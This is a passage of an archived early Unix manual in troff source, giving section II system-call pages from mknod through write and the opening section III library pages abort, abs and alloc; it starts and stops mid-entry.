an attempt is made to link to a directory by a user
other than the super-user;
when an attempt is made to link
to a file on another file system;
when more than 127 links are made.
From C, a \*-1 return indicates an error,
a 0 return indicates success.
-- /usr/man/man2/mknod.2 mode=0100664 uid=3 gid=3 atime=170022230 mtime=173061368 --
.th MKNOD II 8/5/73
.sh NAME
mknod \*- make a directory or a special file
.sh SYNOPSIS
(mknod = 14.; not in assembler)
.br
.ft B
sys  mknod; name; mode; addr
.s3
mknod(name, mode, addr)
.br
char *name;
.ft R
.sh DESCRIPTION
.it Mknod
creates a new file
whose name is the null-terminated string pointed
to by
.it name.
The mode of the new file
(including directory and special file bits)
is initialized from
.it mode.
The first physical address of the file
is initialized from
.it addr.
Note that in the case of a directory,
.it addr
should be zero.
In the case of a special file,
.it addr
specifies which special file.
.s3
.it Mknod
may be invoked only by the super-user.
.sh "SEE ALSO"
mkdir (I), mknod (VIII), fs (V)
.sh DIAGNOSTICS
Error bit (c-bit)
is set if the file already exists
or if the user is not the super-user.
From C, a \*-1 value indicates an error.
-- /usr/man/man2/mount.2 mode=0100664 uid=3 gid=3 atime=170022231 mtime=173061369 --
.th MOUNT II 5/15/74
.sh NAME
mount \*- mount file system
.sh SYNOPSIS
(mount = 21.)
.br
.ft B
sys  mount; special; name; rwflag
.s3
mount(special, name, rwflag)
.br
char *special, *name;
.br
.ft R
.sh DESCRIPTION
.it Mount
announces to the system that a removable file system has
been mounted on
the block-structured special file
.it special;
from now on, references to file
.it name
will refer to
the root file on the newly mounted file system.
.it Special
and
.it name
are pointers to null-terminated strings
containing the appropriate path names.
.s3
.it Name
must exist already. 
Its old contents
are inaccessible while the file system
is mounted.
.s3
The
.it rwflag
argument determines whether
the file system can be written on; if it is 0 writing
is allowed, if non-zero no writing is done.
Physically write-protected and magnetic
tape file systems must be mounted read-only or
errors will occur when access times are updated,
whether or not any
explicit write is attempted.
.sh "SEE ALSO"
mount (VIII), umount (II)
.sh DIAGNOSTICS
Error bit
(c-bit) set if:
.it special
is inaccessible or not an appropriate file;
.it name
does not exist;
.it special
is already mounted;
.it name
is in use;
there are already too many
file systems mounted.
.sh BUGS
\-
-- /usr/man/man2/nice.2 mode=0100664 uid=3 gid=3 atime=170022232 mtime=173061369 --
.th NICE II 8/5/73
.sh NAME
nice \*- set program priority
.sh SYNOPSIS
(nice = 34.)
.br
(priority in r0)
.br
.ft B
sys nice
.s3
nice(priority)
.ft R
.sh DESCRIPTION
The scheduling
.it priority
of the process is changed to the argument.
Positive priorities get less
service than normal; 0 is default.
Only the super-user may specify a negative priority.
The valid range of
.it priority
is 20 to \*-220.
The value of 4 is recommended to users
who wish to execute long-running programs
without flak from the administration.
.s3
The effect of this call is
passed to a child process by the
.it fork
system call.
The effect can be cancelled by
another call to
.it nice
with a
.it priority
of 0.
.s3
The actual running priority of a
process is the
.it priority
argument plus a number that
ranges from 100 to 119 depending on the
cpu usage of the process.
.sh "SEE ALSO"
nice (I)
.sh DIAGNOSTICS
The error bit
(c-bit)
is set if the user requests a
.it priority
outside the range of 0 to 20
and is not the super-user.
-- /usr/man/man2/open.2 mode=0100664 uid=3 gid=3 atime=170022233 mtime=173061369 --
.th OPEN II 8/5/73
.sh NAME
open \*- open for reading or writing
.sh SYNOPSIS
(open = 5.)
.br
.ft B
sys open; name; mode
.br
.ft R
(file descriptor in r0)
.s3
.ft B
open(name, mode)
.br
char *name;
.ft R
.sh DESCRIPTION
.it Open
opens the file
.it name
for reading
(if
.it mode
is 0),
writing (if
.it mode
is 1) or for both reading and writing
(if
.it mode
is 2).
.it Name
is the address of a string of ASCII characters representing
a path name, terminated by a null character.
.s3
The returned file descriptor should be saved for subsequent calls
to
.it read,
.it write,
and
.it close.
.sh "SEE ALSO"
creat (II), read (II), write (II), close (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set if the file does not exist,
if one of the necessary directories
does not exist or is unreadable, if the file is not
readable (resp. writable), or if too many files are open.
From C, a \*-1 value is returned on an error.
-- /usr/man/man2/pipe.2 mode=0100664 uid=3 gid=3 atime=170022234 mtime=173061369 --
.th PIPE II 8/5/73
.sh NAME
pipe \*- create an interprocess channel
.sh SYNOPSIS
(pipe = 42.)
.br
.ft B
sys pipe
.br
.ft R
(read file descriptor in r0)
.br
(write file descriptor in r1)
.s3
.ft B
pipe(fildes)
.br
int fildes[2];
.ft R
.sh DESCRIPTION
The
.it pipe
system call
creates an I/O mechanism called a pipe.
The file descriptors returned can
be used in read and write operations.
When the pipe is written using the descriptor
returned in r1 (resp. fildes[1]),
up to 4096 bytes of data are buffered
before the writing process is suspended.
A read using the descriptor returned in r0
(resp. fildes[0])
will pick up the data.
.s3
It is assumed that after the
pipe has been set up,
two (or more)
cooperating processes
(created by subsequent
.it fork
calls)
will pass data through the
pipe with
.it read
and
.it write
calls.
.s3
The Shell has a syntax
to set up a linear array of processes
connected by pipes.
.s3
Read calls on an empty
pipe (no buffered data) with only one end
(all write file descriptors closed)
return an end-of-file.
Write calls under similar conditions generate
a fatal signal (signal (II)); if the signal is ignored,
an error is returned on the write.
.sh "SEE ALSO"
sh (I), read (II), write (II), fork (II)
.sh DIAGNOSTICS
The error
bit (c-bit) is set if
too many files are already open.
From C, a \*-1 returned value
indicates an error.
A signal is generated if a write on a pipe with only one end is attempted.
.sh BUGS
-- /usr/man/man2/profil.2 mode=0100664 uid=3 gid=3 atime=170022235 mtime=173061369 --
.th PROFIL II 5/15/74
.sh NAME
profil \*- execution time profile
.sh SYNOPSIS
(profil = 44.; not in assembler)
.br
.ft B
sys	profil; buff; bufsiz; offset; scale
.s3
profil(buff, bufsiz, offset, scale)
.br
char buff[ ];
.br
int bufsiz, offset, scale;
.ft R
.sh DESCRIPTION
.it Buff
points to an area of core whose length (in bytes) is given by
.it bufsiz.
After this call, the user's program counter (pc)
is examined each clock tick (60th second);
.it offset
is subtracted from it, and the result multiplied by
.it scale.
If the resulting number corresponds to a word
inside
.it buff,
that word is incremented.
.s3
The scale is interpreted as an unsigned,
fixed-point fraction with binary point at the
left: 177777(8) gives a 1-1 mapping of pc's to words
in
.it buff;
77777(8) maps each pair of instruction words
together.
2(8) maps all instructions onto the beginning of
.it buff
(producing a non-interrupting core clock).
.s3
Profiling is turned off by giving a
.it scale
of 0 or 1.
It is rendered
ineffective by giving a
.it bufsiz
of 0.
Profiling is also turned off when an
.it exec
is executed but remains on in child and parent both
after a
.it fork.
.sh "SEE ALSO"
monitor (III), prof (I)
.sh DIAGNOSTICS
\*-
-- /usr/man/man2/ptrace.2 mode=0110664 uid=3 gid=3 atime=170022236 mtime=173061369 --
.th PTRACE II 1/25/75
.sh NAME
ptrace  \*-  process trace
.sh SYNOPSIS
.nf
(ptrace = 26.; not in assembler)
(data in r0)
.ft B
sys	ptrace; pid; addr; request
.ft R
.br
(value in r0)
.ft B
.s3
ptrace(request, pid, addr, data);
.ft R
.fi
.sh DESCRIPTION
.it Ptrace
provides a means by which a parent process
may control the execution of a child process,
and examine and change its core image.
Its primary use is for the implementation of breakpoint debugging,
but it should be adaptable for simulation of non-UNIX environments.
There are four arguments whose interpretation
depends on a
.it request
argument.
Generally,
.it pid
is the process ID of the traced process,
which must be a child (no more distant descendant)
of the tracing process.
A process being traced
behaves normally until it encounters some signal whether internally generated
like ``illegal instruction'' or externally generated like ``interrupt.''
See signal (II) for the list.
Then the traced process enters a stopped state
and its parent is notified via
.it wait
(II).
When the child is in the stopped state,
its core image can be examined and modified
using
.it ptrace.
If desired, another
.it ptrace
request can then cause the child either to terminate
or to continue, possibly ignoring the signal.
.s3
The value of the
.it request
argument determines the precise
action of the call:
.s3
.lp +4 4
0	This request is the only one used by the child process;
it declares that the process is to be traced by its parent.
All the other arguments are ignored.
Peculiar results will ensue
if the parent does not expect to trace the child.
.s3
.lp +4 4
1,2	The
word in the child process's address space
at
.it addr
is returned (in r0).
Request 1 indicates the data space (normally used);
2 indicates the instruction space (when I and D space are separated).
.it addr
must be even.
The child must be stopped.
The input
.it data
is ignored.
.s3
.lp +4 4
3	The word
of the system's per-process data area corresponding to
.it addr
is returned.
.it Addr
must be even and less than 512.
This space contains the registers and other information about
the process;
its layout corresponds to the
.it user
structure in the system.
.s3
.lp +4 4
4,5	The
given
.it data
is written at the word in the process's address space corresponding to
.it addr,
which must be even.
No useful value is returned.
Request 4 specifies data space (normally used), 5 specifies
instruction space.
Attempts to write in pure procedure result in termination of the
child, instead of going through or causing an error for the parent.
.s3
.lp +4 4
6	The process's system data is written,
as it is read with request 3.
Only a few locations can be written in this way:
the general registers,
the floating point status and registers,
and certain bits of the processor status word.
.s3
.lp +4 4
7	The
.it data
argument is taken as a signal number
and the child's execution continues
as if it had incurred that signal.
Normally the signal number will be
either 0 to indicate that the signal which caused the stop
should be ignored,
or that value fetched out of the
process's image indicating which signal caused
the stop.
.s3
.lp +4 4
8	The traced process terminates.
.s3
.i0
As indicated,
these calls
(except for request 0)
can be used only when the subject process has stopped.
The
.it wait
call is used to determine
when a process stops;
in such a case the ``termination'' status
returned by
.it wait
has the value 0177 to indicate stoppage rather
than genuine termination.
.s3
To forestall possible fraud,
.it ptrace
inhibits the set-user-id facility
on subsequent
.it exec
(II)
 calls.
.sh "SEE ALSO"
wait (II), signal (II), cdb (I)
.sh DIAGNOSTICS
From assembler, the c-bit (error bit) is set on errors;
from C, \-1 is returned and
.it errno
has the error code.
.sh BUGS
The request 0 call should be able to specify
signals which are to be treated normally and not cause a stop.
In this way, for example,
programs with simulated floating point (which
use ``illegal instruction'' signals at a very high rate)
could be efficiently debugged.
.s3
Also, it should be possible to stop a process on occurrence of a system
call;
in this way a completely controlled environment could
be provided.
-- /usr/man/man2/read.2 mode=0100664 uid=3 gid=3 atime=170022237 mtime=173061369 --
.th READ II 8/5/73
.sh NAME
read \*- read from file
.sh SYNOPSIS
(read = 3.)
.br
(file descriptor in r0)
.ft B
.br
sys read; buffer; nbytes
.br
.s3
read(fildes, buffer, nbytes)
.br
char *buffer;
.ft R
.sh DESCRIPTION
A file descriptor is a word
returned from a successful
.it "open, creat, dup,"
or
.it pipe
call.
.it Buffer
is the location of
.it nbytes
contiguous
bytes into which the input will be placed.
It is not guaranteed
that all
.it nbytes
bytes will be read; for example
if the file refers to a typewriter at most one line
will be returned.
In any event the number of characters read is returned
(in r0).
.s3
If the returned value is 0, then
end-of-file has been reached.
.sh "SEE ALSO"
open (II), creat (II), dup (II), pipe (II)
.sh DIAGNOSTICS
As mentioned,
0 is returned when the end of the file has been reached.
If the read was otherwise unsuccessful
the error bit (c-bit) is set.
Many conditions
can generate an error:
physical I/O errors, bad buffer address,
preposterous
.it nbytes,
file descriptor not that of
an input file.
From C, a \*-1 return indicates the error.
-- /usr/man/man2/seek.2 mode=0100664 uid=3 gid=3 atime=170022238 mtime=173061369 --
.th SEEK II 8/5/73
.sh NAME
seek \*- move read/write pointer
.sh SYNOPSIS
(seek = 19.)
.br
(file descriptor in r0)
.ft B
.br
sys seek; offset; ptrname
.s3
seek(fildes, offset, ptrname)
.ft R
.sh DESCRIPTION
The file
descriptor refers to a file open for reading or writing.
The read (resp. write) pointer for the file is set as follows:
.s3
.lp +6 3
if
.it ptrname
is 0, the pointer is set to
.it offset.
.s3
.lp +6 3
if
.it ptrname
is 1, the pointer is set to its current location plus
.it offset.
.s3
.lp +6 3
if
.it ptrname
is 2, the pointer is set to the size of the
file plus
.it offset.
.s3
.lp +6 3
if
.it ptrname
is 3, 4 or 5,
the meaning is as above for
0, 1 and 2 except that
the offset is
multiplied by 512.
.s3
.i0
If
.it ptrname
is 0 or 3,
.it offset
is unsigned,
otherwise
it is signed.
.sh "SEE ALSO"
open (II), creat (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set for an undefined file descriptor.
From C, a \*-1 return indicates an error.
-- /usr/man/man2/setgid.2 mode=0100664 uid=3 gid=3 atime=170022239 mtime=173061369 --
.th SETGID II 8/5/73
.sh NAME
setgid \*- set process group ID
.sh SYNOPSIS
(setgid = 46.; not in assembler)
.br
(group ID in r0)
.ft B
.br
sys setgid
.s3
setgid(gid)
.ft R
.sh DESCRIPTION
The group ID of the current process is set to
the argument.
Both the effective and the real group ID are set.
This call is only permitted to the super-user
or if the argument is the real group ID.
.sh "SEE ALSO"
getgid (II)
.sh DIAGNOSTICS
Error bit
(c-bit) is set as indicated;
from C, a \*-1 value is returned.
-- /usr/man/man2/setuid.2 mode=0100664 uid=3 gid=3 atime=170022240 mtime=173061369 --
.th SETUID II 8/5/73
.sh NAME
setuid \*- set process user ID
.sh SYNOPSIS
(setuid = 23.)
.br
(user ID in r0)
.ft B
.br
sys setuid
.s3
setuid(uid)
.ft R
.sh DESCRIPTION
The user ID of the current process is set to
the argument.
Both the effective and the real user ID are set.
This call is only permitted to the super-user
or if the argument is the real user ID.
.sh "SEE ALSO"
getuid (II)
.sh DIAGNOSTICS
Error bit
(c-bit) is set as indicated;
from C, a \*-1 value is returned.
-- /usr/man/man2/signal.2 mode=0100664 uid=3 gid=3 atime=170022241 mtime=173061369 --
.th SIGNAL II 8/5/73
.sh NAME
signal \*- catch or ignore signals
.sh SYNOPSIS
(signal = 48.)
.br
.ft B
sys  signal; sig; label
.ft R
.br
(old value in r0)
.s3
.ft B
signal(sig, func)
.br
int (*func)( );
.ft R
.sh DESCRIPTION
A
.it signal
is generated by some abnormal event,
initiated either by user at a typewriter (quit, interrupt),
by a program error (bus error, etc.),
or by request of another program (kill).
Normally all signals
cause termination of the receiving process,
but this call allows them either to be ignored
or to cause an interrupt to a specified location.
Here is the list of signals:
.s3
.lp +10 5
1	hangup
.lp +10 5
2	interrupt
.lp +10 5
3*	quit
.lp +10 5
4*	illegal instruction (not reset when caught)
.lp +10 5
5*	trace trap (not reset when caught)
.lp +10 5
6*	IOT instruction
.lp +10 5
7*	EMT instruction
.lp +10 5
8*	floating point exception
.lp +10 5
9	kill (cannot be caught or ignored)
.lp +10 5
10*	bus error
.lp +10 5
11*	segmentation violation
.lp +10 5
12*	bad argument to system call
.lp +10 5
13	write on a pipe with no one to read it
.s3
.i0
In the assembler call, if
.it label
is 0,
the process is terminated
when the signal occurs; this is the default action.
If
.it label
is odd, the signal is ignored.
Any other even
.it label
specifies an address in the process
where an interrupt is simulated.
An RTI or RTT instruction will return from the
interrupt.
Except as indicated,
a signal is reset to 0 after being caught.
Thus if it is desired to
catch every such signal,
the catching routine must
issue another
.it signal
call.
.s3
In C,
if
.it func
is 0, the default action
for signal
.it sig
(termination)
is reinstated.
If
.it func
is 1,
the signal is ignored.
If
.it func
is non-zero and
even, it is assumed to be the address
of a function entry point.
When the signal occurs,
the function will be called.
A return from the function will
continue the process at the point it was interrupted.
As in the assembler call,
.it signal
must in general be called again to catch subsequent signals.
.s3
When a caught signal occurs
during certain system calls, the call terminates prematurely.
In particular this can occur
during a
.it read
or
.it write
on a slow device (like a typewriter; but not a file);
and during
.sleep
or
.it wait.
When such a signal occurs, the saved user status
is arranged in such a way that when return from the
signal-catching takes place, it will appear that the
system call returned a characteristic error status.
The user's program may then, if it wishes,
re-execute the call.
.s3
The starred signals in the list above cause a core image
if not caught or ignored.
.s3
The value of the call is the old action defined for the signal.
.s3
After a
.it fork
(II)
the child inherits
all signals.
.it Exec
(II)
resets all
caught signals to default action.
.sh "SEE ALSO"
kill (I), kill (II),
ptrace (II),
reset (III)
.sh DIAGNOSTICS
The error bit
(c-bit)
is set if the
given signal is out of range.
In C, a \*-1 indicates an error;
0 indicates success.
.sh BUGS
-- /usr/man/man2/sleep.2 mode=0100664 uid=3 gid=3 atime=170022242 mtime=173061369 --
.th SLEEP II 8/5/73
.sh NAME
sleep \*- stop execution for interval
.sh SYNOPSIS
(sleep = 35.; not in assembler)
.br
(seconds in r0)
.br
.ft B
sys sleep
.s3
sleep(seconds)
.ft R
.sh DESCRIPTION
The
current process is suspended from execution
for the number of seconds specified
by the argument.
.sh "SEE ALSO"
sleep (I)
.sh DIAGNOSTICS
\*-
-- /usr/man/man2/stat.2 mode=0100664 uid=3 gid=3 atime=170022243 mtime=173061369 --
.th STAT II 8/5/73
.sh NAME
stat \*- get file status
.sh SYNOPSIS
(stat = 18.)
.br
.ft B
sys stat; name; buf
.s3
stat(name, buf)
.br
char *name;
.br
struct inode *buf;
.ft R
.sh DESCRIPTION
.it Name
points to a null-terminated string naming
a file;
.it buf
is the address of a 36(10) byte buffer
into which information is placed concerning the file.
It is unnecessary to have any
permissions at all with respect to the file, but all directories
leading to the file must be readable.
After
.it stat,
.it buf
has the following structure (starting offset given in bytes):
.s3
.if t .ta .5i 1i 2.5i
.if n .ta 3 9 24
.nf
struct inode {
	char	minor;	/* +0: minor device of i-node */
	char	major;	/* +1: major device */
	int	inumber;	/* +2 */
	int	flags;	/* +4: see below */
	char	nlinks;	/* +6: number of links to file */
	char	uid;	/* +7: user ID of owner */
	char	gid;	/* +8: group ID of owner */
	char	size0;	/* +9: high byte of 24-bit size */
	int	size1;	/* +10: low word of 24-bit size */
	int	addr[8];	/* +12: block numbers or device number */
	int	actime[2];	/* +28: time of last access */
	int	modtime[2];	/* +32: time of last modification */
};
.fi
.s3
The flags are as follows:
.s3
.lp +10 9
100000	i-node is allocated
.lp +10 9
060000	2-bit file type:
.lp +15 9
000000	plain file
.lp +15 9
040000	directory
.lp +15 9
020000	character-type special file
.lp +15 9
060000	block-type special file.
.lp +10 9
010000	large file
.lp +10 9
004000	set user-ID on execution
.lp +10 9
002000	set group-ID on execution
.lp +10 9
001000	save text image after execution
.lp +10 9
000400	read (owner)
.lp +10 9
000200	write (owner)
.lp +10 9
000100	execute (owner)
.lp +10 9
000070	read, write, execute (group)
.lp +10 9
000007	read, write, execute (others)
.i0
.sh "SEE ALSO"
ls (I), fstat (II), fs (V)
.sh DIAGNOSTICS
Error bit (c-bit)
is set if the file cannot be found.
From C, a \*-1 return indicates an error.
-- /usr/man/man2/stime.2 mode=0100664 uid=3 gid=3 atime=170022244 mtime=173061369 --
.th STIME II 8/5/73
.sh NAME
stime \*- set time
.sh SYNOPSIS
(stime = 25.)
.br
(time in r0-r1)
.br
.ft B
sys stime
.s3
stime(tbuf)
.br
int tbuf[2];
.ft R
.sh DESCRIPTION
.it Stime
sets the system's idea of the time and date.
Time is measured in seconds from 0000 GMT Jan 1 1970.
Only the super-user may use this call.
.sh "SEE ALSO"
date (I), time (II), ctime (III)
.sh DIAGNOSTICS
Error bit (c-bit)
set if user is not the super-user.
-- /usr/man/man2/stty.2 mode=0110664 uid=3 gid=3 atime=170022245 mtime=173061369 --
.th STTY II 12/15/74
.sh NAME
stty \*- set mode of typewriter
.sh SYNOPSIS
(stty = 31.)
.br
(file descriptor in r0)
.br
.ft B
sys stty; arg
.br
.li
...
.br
arg:  .byte ispeed, ospeed; .byte erase, kill; mode
.s3
.nf
stty(fildes, arg)
struct {
	char	ispeed, ospeed;
	char	erase, kill;
	int 	mode;
} *arg;
.fi
.ft R
.s3
.sh DESCRIPTION
.it Stty
sets mode bits and character speeds for the typewriter whose file descriptor
is passed in r0 (resp. is the first argument to the call).
First, the system delays until the typewriter is quiescent.
The input and output speeds are set from the first two bytes
of the argument structure
as indicated by the following table,
which corresponds to the
speeds supported by the DH-11 interface.
If DC-11, DL-11 or KL-11 interfaces are used,
impossible speed changes are ignored.
.s3
.lp +8 4
0	(hang up dataphone)
.lp +8 4
1	50 baud
.lp +8 4
2	75 baud
.lp +8 4
3	110 baud
.lp +8 4
4	134.5 baud
.lp +8 4
5	150 baud
.lp +8 4
6	200 baud
.lp +8 4
7	300 baud
.lp +8 4
8	600 baud
.lp +8 4
9	1200 baud
.lp +8 4
10	1800 baud
.lp +8 4
11	2400 baud
.lp +8 4
12	4800 baud
.lp +8 4
13	9600 baud
.lp +8 4
14	External A
.lp +8 4
15	External B
.s3
.i0
In the current configuration,
only 110, 150 and 300 baud are really supported on dial-up lines,
in that the code conversion and line control required for
IBM 2741's (134.5 baud)
must be implemented by the user's
program,
and the half-duplex line discipline
required for the 202 dataset (1200 baud)
is not supplied.
.s3
The next two characters of the argument structure
specify the erase and kill characters respectively.
(Defaults are # and @.)
.s3
The
.it mode
contains several bits which determine the
system's treatment of the typewriter:
.s3
.lp +12 7
100000	Select one of two algorithms for backspace delays
.lp +12 7
040000	Select one of two algorithms for form-feed and vertical-tab delays
.lp +12 7
030000	Select one of four algorithms for carriage-return delays
.lp +12 7
006000	Select one of four algorithms for tab delays
.lp +12 7
001400	Select one of four algorithms for new-line delays
.lp +12 7
000200	even parity allowed on input (e. g. for M37s)
.lp +12 7
000100	odd parity allowed on input
.lp +12 7
000040	raw mode: wake up on all characters
.lp +12 7
000020	map CR into LF; echo LF or CR as CR-LF
.lp +12 7
000010	echo (full duplex)
.lp +12 7
000004	map upper case to lower on input (e. g. M33)
.lp +12 7
000002	echo and print tabs as spaces
.lp +12 7
000001	hang up (remove `data terminal ready,' lead CD) after last close
.i0
.s3
The delay bits specify how long
transmission stops to allow for mechanical or other movement
when certain characters are sent to the terminal.
In all cases a value of 0 indicates no delay.
.s3
Backspace delays are currently ignored but will
be used for Terminet 300's.
.s3
If a form-feed/vertical tab delay is specified,
it lasts for about 2 seconds.
.s3
Carriage-return delay type 1 lasts about .08 seconds
and is suitable for the Terminet 300.
Delay type 2 lasts about .16 seconds and is suitable
for the VT05 and the TI 700.
Delay type 3 is unimplemented and is 0.
.s3
New-line delay type 1 is dependent on the current column
and is tuned for Teletype model 37's.
Type 2 is useful for the VT05 and is about .10 seconds.
Type 3 is unimplemented and is 0.
.s3
Tab delay type 1 is dependent on the amount of movement
and is tuned to the Teletype model
37.
Other types are unimplemented and are 0.
.s3
Characters with the wrong parity, as determined by bits 200 and
100, are ignored.
.s3
In raw mode, every character is passed immediately
to the program without waiting until a full line has been typed.
No erase or kill processing is done;
the end-of-file character (EOT), the interrupt character
(DEL) and the quit character (FS) are not treated specially.
.s3
Mode 020 causes input carriage returns to be turned into
new-lines;
input of either CR or LF causes LF-CR both to
be echoed
(used for GE TermiNet 300's and other terminals without the newline function).
.s3
The hangup mode 01
causes the line to be disconnected
when the last process with the line open closes it or terminates.
It is useful when a port is to be used for some special
purpose;
for example, if it is associated
with an ACU used to place outgoing calls.
.s3
This system call is also used with certain special
files other than typewriters,
but since none of them are part of the standard system
the specifications will not be given.
.sh "SEE ALSO"
stty (I), gtty (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set if the file descriptor does not refer to a typewriter.
From C, a negative value indicates an error.
-- /usr/man/man2/sync.2 mode=0100664 uid=3 gid=3 atime=170022247 mtime=173061369 --
.th SYNC II 8/5/73
.sh NAME
sync \*- update super-block
.sh SYNOPSIS
(sync = 36.; not in assembler)
.br
.ft B
sys  sync
.ft R
.sh DESCRIPTION
.it Sync
causes all information in core
memory that should be on disk to be written out.
This includes modified super blocks,
modified i-nodes, and delayed block I/O.
.s3
It should be used by programs which examine a file system,
for example
.it "icheck, df,"
etc.
It is mandatory before a boot.
.sh "SEE ALSO"
sync (VIII), update (VIII)
.sh DIAGNOSTICS
\*-
-- /usr/man/man2/time.2 mode=0100664 uid=3 gid=3 atime=170022248 mtime=173061369 --
.th TIME II 8/5/73
.sh NAME
time \*- get date and time
.sh SYNOPSIS
(time = 13.)
.br
.ft B
sys  time
.s3
time(tvec)
.br
int tvec[2];
.ft R
.sh DESCRIPTION
.it Time
returns the time since 00:00:00 GMT, Jan. 1, 1970, measured
in seconds.
From
.it as,
the high order word is in the r0 register and the low order
is in r1.
From C, the user-supplied vector is filled in.
.sh "SEE ALSO"
date (I), stime (II), ctime (III)
.sh DIAGNOSTICS
\*-
-- /usr/man/man2/times.2 mode=0100664 uid=3 gid=3 atime=170022249 mtime=173061369 --
.th TIMES II 8/5/73
.sh NAME
times \*- get process times
.sh SYNOPSIS
(times = 43.; not in assembler)
.br
.ft B
sys  times; buffer
.s3
times(buffer)
.br
struct tbuffer *buffer;
.ft R
.sh DESCRIPTION
.it Times
returns time-accounting information
for the current process
and for the terminated child processes
of the current process.
All times are in 1/60 seconds.
.s3
After the call, the buffer will appear as follows:
.s3
.nf
struct tbuffer {
	int	proc\*_user\*_time;
	int	proc\*_system\*_time;
	int	child\*_user\*_time[2];
	int	child\*_system\*_time[2];
};
.s3
.fi
The children times are the sum
of the children's process times and
their children's times.
.sh "SEE ALSO"
time (I)
.sh DIAGNOSTICS
\*-
.sh BUGS
The process times should be 32 bits as well.
-- /usr/man/man2/umount.2 mode=0100664 uid=3 gid=3 atime=170022250 mtime=173061369 --
.th UMOUNT II 8/5/73
.sh NAME
umount \*- dismount file system
.sh SYNOPSIS
(umount = 22.)
.br
.ft B
sys  umount; special
.ft R
.sh DESCRIPTION
.it Umount
announces to the system that special
file
.it special
is no longer to contain
a removable file system.
The file associated with the special
file reverts to its ordinary interpretation;
see
.it mount
(II).
.s3
.sh "SEE ALSO"
umount (VIII), mount (II)
.sh DIAGNOSTICS
Error bit
(c-bit) set if
no
file system was mounted on the special file
or if there are still active files on the
mounted file system.
-- /usr/man/man2/unlink.2 mode=0100664 uid=3 gid=3 atime=170022251 mtime=173061369 --
.th UNLINK II 8/5/73
.sh NAME
unlink \*- remove directory entry
.sh SYNOPSIS
(unlink = 10.)
.br
.ft B
sys  unlink; name
.s3
unlink(name)
.br
char *name;
.ft R
.sh DESCRIPTION
.it Name
points to a null-terminated string.
.it Unlink
removes the entry for the file pointed to by
.it name
from its directory.
If this entry was the last link to the file,
the contents of the file are freed and the file is destroyed.
If, however, the file was open in any process, the actual
destruction is delayed until it is closed, even though
the directory entry has disappeared.
.sh "SEE ALSO"
rm (I), rmdir (I), link (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set to indicate that the file does not
exist or that its directory cannot be written.
Write permission is not required on the file itself.
It is also illegal to unlink a directory
(except for the super-user).
From C, a \*-1 return indicates an error.
-- /usr/man/man2/wait.2 mode=0100664 uid=3 gid=3 atime=170022251 mtime=173061369 --
.th WAIT II 2/9/75
.sh NAME
wait \*- wait for process to terminate
.sh SYNOPSIS
(wait = 7.)
.br
.ft B
sys  wait
.ft R
.br
(process ID in r0)
.br
(status in r1)
.s3
.ft B
wait(status)
.br
int *status;
.ft R
.sh DESCRIPTION
.it Wait
causes its caller to delay until one of its child
processes terminates.
If any child has died since the last
.it wait,
return is immediate;
if there are no children, return is immediate with
the error bit set
(resp. with a value of \*-1 returned).
The normal return yields the process ID of the terminated child
(in r0).
In the case of several children several
.it wait
calls are needed
to learn of all the deaths.
.s3
If no error is indicated on return,
the r1 high byte (resp. the high byte stored into
.it status
) contains the low byte of the
child process r0 (resp. the argument of
.it exit
) when it terminated.
The r1 (resp.
.it status
) low byte contains the termination status
of the process.
See signal (II) for
a list of termination statuses (signals);
0 status indicates normal termination.
A special status (0177) is returned for a stopped process
which has not terminated and can be restarted.
See ptrace (II).
If the 0200 bit of the termination status
is set,
a core image of the process was produced
by the system.
.s3
If the parent process terminates without
waiting on its children,
the initialization process
(process ID = 1)
inherits the children.
.sh "SEE ALSO"
exit (II), fork (II), signal (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set if there are no children not previously waited for.
From C, a returned value of \*-1 indicates an error.
-- /usr/man/man2/write.2 mode=0100664 uid=3 gid=3 atime=170022252 mtime=173061369 --
.th WRITE II 8/5/73
.sh NAME
write \*- write on a file
.sh SYNOPSIS
(write = 4.)
.br
(file descriptor in r0)
.br
.ft B
sys  write; buffer; nbytes
.s3
write(fildes, buffer, nbytes)
.br
char *buffer;
.ft R
.sh DESCRIPTION
A file descriptor is a word returned from a
successful
.it open,
.it creat,
.it dup,
or
.it pipe
call.
.s3
.it Buffer
is the address of
.it nbytes
contiguous
bytes which are written on the output file.
The number of characters actually written is returned (in r0).
It should be regarded as an error
if this is not the same as requested.
.s3
Writes which are multiples
of 512 characters long and begin on a 512-byte boundary
in the file
are more efficient than any others.
.sh "SEE ALSO"
creat (II), open (II), pipe (II)
.sh DIAGNOSTICS
The error bit
(c-bit) is set on an error: bad descriptor, buffer address, or
count; physical I/O errors.
From C, a returned value of \*-1 indicates an error.
-- /usr/man/man3 mode=0140775 uid=3 gid=3 atime=173059743 mtime=173059709 --
-- /usr/man/man3/abort.3 mode=0100664 uid=3 gid=3 atime=170022255 mtime=173059744 --
.th ABORT III 4/10/75
.sh NAME
abort  \*-  generate an IOT fault
.sh SYNOPSIS
.bd abort()
.sh DESCRIPTION
.it Abort
executes the IOT instruction.
This is usually considered a program
fault by the system and results in
termination with a core dump.
It is used to generate a core image
for debugging.
.sh "SEE ALSO"
db (I), cdb (I),
signal (II)
.sh DIAGNOSTICS
usually ``IOT trap -- core dumped'' from the Shell.
.sh BUGS
-- /usr/man/man3/abs.3 mode=0100664 uid=3 gid=3 atime=170022256 mtime=173059744 --
.th ABS III 2/9/75
.sh NAME
abs, fabs \*- absolute value
.sh SYNOPSIS
.ft B
abs(i)
.br
int i;
.s3
double fabs(x)
.br
double x;
.ft R
.s3
.sh DESCRIPTION
.it Abs
returns
the absolute value of its integer operand;
.it fabs
is the
.it double
version.
-- /usr/man/man3/alloc.3 mode=0100664 uid=3 gid=3 atime=170022257 mtime=173059744 --
.th ALLOC III 3/1/74
.sh NAME
alloc, free \*- core allocator
.sh SYNOPSIS
.ft B
.nf
char *alloc(size)
.s3
free(ptr)
char *ptr;
.fi
.ft R
.sh DESCRIPTION
.it Alloc
and
.it free
provide a simple general-purpose core management package.
.it Alloc
is given a size in bytes; it returns a pointer
to an area at least that size which
is even and hence can hold an object of any type.
The argument to
.it free
is a pointer to an area previously allocated by
.it alloc;
this space is made available for further allocation.
.s3
Needless to say, grave disorder will result if the space
assigned by
.it alloc
is overrun or if some random number is handed to
.it free.
.s3
The routine uses a first-fit algorithm which
coalesces blocks being freed with other
blocks already free.
It calls
.it sbrk
(see
.it "break (II))"
